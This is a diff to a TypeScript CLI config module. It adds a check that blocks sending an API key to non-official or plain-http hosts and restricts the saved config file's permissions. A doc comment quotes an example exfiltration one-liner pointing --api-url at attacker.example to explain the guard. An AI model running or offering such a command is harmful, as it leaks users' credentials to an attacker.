@@ -1,8 +1,52 @@
-import { existsSync, readFileSync, writeFileSync } from 'node:fs';
+import { chmodSync, existsSync, readFileSync, writeFileSync } from 'node:fs';
 import { dirname, join, resolve } from 'node:path';
 
 export const CONFIG_FILE = '.flagrship.json';
 export const DEFAULT_API_URL = 'https://api.flagrship.dev';
+
+/** Hosts the CLI will send an API key to without being told twice. */
+const OFFICIAL_HOST = 'flagrship.dev';
+const LOOPBACK = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);
+
+const isLoopback = (host: string) => LOOPBACK.has(host) || host.endsWith('.localhost');
+const isOfficial = (host: string) => host === OFFICIAL_HOST || host.endsWith(`.${OFFICIAL_HOST}`);
+
+/**
+ * Guards the one command that hands an API key to a hostname of someone else's
+ * choosing. `flagrship init --key sk_live_… --api-url https://attacker.example`
+ * is a working credential-exfiltration one-liner if nothing checks it, and it is
+ * the kind of thing that gets pasted into a terminal from a README or a chat.
+ *
+ * Runs *before* the key is sent anywhere, because a warning printed afterwards
+ * is just a receipt.
+ */
+export function assertSafeApiUrl(apiUrl: string, allowCustomHost = false): void {
+  let url: URL;
+  try {
+    url = new URL(apiUrl);
+  } catch {
+    throw new CliError(`--api-url is not a valid URL: ${apiUrl}`);
+  }
+
+  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
+    throw new CliError(`--api-url must be http or https, got "${url.protocol}".`);
+  }
+
+  if (url.protocol === 'http:' && !isLoopback(url.hostname)) {
+    throw new CliError(
+      `Refusing to send an API key over plain http to ${url.host}. Use https, ` +
+        `or a local address if you are running the API yourself.`,
+    );
+  }
+
+  if (!isOfficial(url.hostname) && !isLoopback(url.hostname) && !allowCustomHost) {
+    throw new CliError(
+      `Refusing to send your API key to ${url.host}, which is not a Flagrship host.\n` +
+        `  If you are self-hosting the API and meant to do this, re-run with --allow-custom-host.\n` +
+        `  If someone gave you this command, do not run it - it would hand them your key.`,
+    );
+  }
+}
 
 /**
  * One key per environment. An API key is scoped to exactly one environment on
@@ -48,8 +92,20 @@ export function loadConfig(): { path: string; config: Config } {
   return { path, config };
 }
 
+/**
+ * Owner-read/write only. `mode` applies on create; an existing file keeps the
+ * permissions it already had, so chmod as well. Both are no-ops on Windows,
+ * where the file inherits the directory's ACL - documented, not silently
+ * assumed.
+ */
 export function saveConfig(path: string, config: Config): void {
-  writeFileSync(path, JSON.stringify(config, null, 2) + '\n');
+  writeFileSync(path, JSON.stringify(config, null, 2) + '\n', { mode: 0o600 });
+  try {
+    chmodSync(path, 0o600);
+  } catch {
+    // Windows and some network filesystems do not implement it. The write
+    // succeeded, which is the part that matters.
+  }
 }
 
 /** Picks the key for `--env`, or the default environment when none was given. */
